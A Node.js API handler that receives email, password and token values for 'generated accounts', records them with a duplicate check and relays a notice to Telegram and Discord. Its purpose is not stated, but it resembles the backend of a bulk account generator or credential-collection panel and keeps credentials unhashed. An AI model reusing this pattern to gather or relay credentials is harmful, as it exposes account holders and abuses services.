const {
  cors,
  requireAuth,
  readJson,
  readEnv,
  recordAccount,
  listRecentAccounts,
  tgSendMessage,
  discordWebhook,
} = require("./_lib");

/** Report generated account — duplicate guard + optional notify (same secrets as forward) */

module.exports = async (req, res) => {
  cors(res);
  if (req.method === "OPTIONS") return res.status(204).end();
  if (!requireAuth(req, res, "/api/account")) return;

  if (req.method === "GET") {
    const recent = listRecentAccounts(20).map((a) => ({
      email: a.email,
      reason: a.reason,
      at: a.at,
      version: a.version,
    }));
    return res.status(200).json({ ok: true, recent, n: recent.length });
  }

  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "method not allowed" });
  }

  const body = await readJson(req);
  const reason = (req.headers["x-evs-reason"] || body.reason || "account_created").toString();
  const email = (req.headers["x-evs-email"] || body.email || "").toString().trim();
  const password = (req.headers["x-evs-password"] || body.password || "").toString();
  const token = (req.headers["x-evs-token"] || body.token || "").toString();

  if (!email || !password) {
    return res.status(400).json({ ok: false, error: "email and password required" });
  }

  const result = recordAccount({
    email,
    password,
    token,
    reason,
    device: body.device || req.headers["x-app-device"] || "",
    version: body.version || req.headers["x-app-version"] || "",
  });

  if (result.blocked) {
    return res.status(409).json({
      ok: false,
      blocked: true,
      count: result.count,
      error: result.message,
    });
  }

  // Same notify path as local secrets (optional)
  const line = `📩 Account · \`${email}\`\nReason: ${reason}\nDup#: ${result.count}`;
  await tgSendMessage(readEnv("TG_BOT_TOKEN"), readEnv("TG_CHANNEL_ID"), line);
  await discordWebhook(
    readEnv("DC_WEBHOOK_URL"),
    line.replace(/`/g, ""),
    readEnv("DC_WEBHOOK_NAME", "EVS"),
    readEnv("DC_WEBHOOK_PFP")
  );

  return res.status(200).json({
    ok: true,
    stored: true,
    count: result.count,
    message: result.message,
  });
};
